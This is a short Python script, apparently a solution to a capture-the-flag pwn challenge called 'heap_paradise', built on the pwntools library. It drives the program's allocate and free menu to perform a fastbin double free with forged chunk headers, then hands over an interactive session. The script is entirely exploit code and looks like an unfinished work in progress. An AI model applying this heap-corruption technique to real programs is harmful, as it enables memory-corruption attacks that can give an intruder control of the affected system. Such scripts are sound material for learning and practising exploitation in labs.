from pwn import *

def malloc(size, content):
    p.sendafter(":", "1")
    p.sendafter("Size :", str(size))
    p.sendafter("Data :", content)

def free(idx):
    p.sendafter(":", "2")
    p.sendafter("Index :", str(idx))

elf = ELF("./heap_paradise")
libc = elf.libc

while True:
    p = process("./heap_paradise")
    pause()
    malloc(96, p64(0x0)*3+p64(0x71))
    malloc(96, "a" * 8 + "b" * 8 + p64(0x0) + p64(0x51) + p64(0x0) * 3 + p64(0x31))
    free(0)
    free(1)
    free(0)
    malloc(96, "\x20")
    malloc(96, "\x00")
    malloc(96, "\x00")
    malloc(96, "\x00")
    free(0)
    malloc(96, p64(0x0) * 3 + p64(0x91))
    free(5)
    p.interactive()

